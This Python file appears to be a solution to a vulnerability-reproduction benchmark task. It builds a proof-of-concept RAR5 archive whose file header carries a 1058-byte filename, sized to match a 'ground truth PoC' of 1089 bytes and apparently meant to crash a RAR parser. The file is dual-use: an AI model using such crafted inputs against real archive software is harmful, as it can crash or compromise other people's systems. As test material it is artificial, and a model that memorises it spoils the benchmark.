import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        def to_vint(n):
            bs = bytearray()
            while True:
                b = n & 0x7f
                n >>= 7
                if n:
                    bs.append(b | 0x80)
                else:
                    bs.append(b)
                    break
            return bytes(bs)

        def make_crc(data):
            return struct.pack('<I', zlib.crc32(data) & 0xFFFFFFFF)

        # 1. RAR5 Signature
        # 52 61 72 21 1A 07 01 00
        sig = b"\x52\x61\x72\x21\x1A\x07\x01\x00"

        # 2. Main Archive Header (Type 1)
        # Structure: [CRC][Size][HeaderData]
        # HeaderData: [Type][Flags][ArchiveFlags][VolNum?]
        
        # Fields:
        # Type: 1 (Main Header)
        # Flags: 0 (No extra flags)
        # ArchiveFlags: 0
        mh_data = to_vint(1) + to_vint(0) + to_vint(0)
        
        mh_size = to_vint(len(mh_data))
        mh_crc = make_crc(mh_data)
        
        main_header = mh_crc + mh_size + mh_data

        # 3. File Header (Type 2)
        # Structure: [CRC][Size][HeaderData]
        # HeaderData: [Type][Flags][Extra?][Data?][FileHeaderBody]
        # FileHeaderBody: [FileFlags][UnpSize][Attr][...][NameLen][Name]
        
        # We calculate the Name Length to match the ground truth PoC size of 1089 bytes.
        # Current overhead: Sig(8) + MH(8) = 16 bytes.
        # Target total: 1089. Remaining: 1073 bytes.
        # FH Overhead calc:
        # CRC(4) + Size(2) + Type(1) + Flags(1) + FileFlags(1) + UnpSize(1) + Attr(1) + Comp(1) + Host(1) + NameLen(2) = 15 bytes.
        # Name size = 1073 - 15 = 1058 bytes.
        
        name_len = 1058
        name = b'A' * name_len
        
        # Construct File Header Body
        fh_body = bytearray()
        fh_body.extend(to_vint(0)) # FileFlags
        fh_body.extend(to_vint(0)) # Unpacked Size
        fh_body.extend(to_vint(0)) # Attributes
        # Flags=0 implies no MTime, no CRC32 field
        fh_body.extend(to_vint(0)) # Compression
        fh_body.extend(to_vint(0)) # Host OS
        fh_body.extend(to_vint(name_len))
        fh_body.extend(name)
        
        # Construct Header Data
        # Type: 2 (File Header)
        # Flags: 0
        fh_header_data = to_vint(2) + to_vint(0) + bytes(fh_body)
        
        fh_size = to_vint(len(fh_header_data))
        fh_crc = make_crc(fh_header_data)
        
        file_header = fh_crc + fh_size + fh_header_data
        
        return sig + main_header + file_header
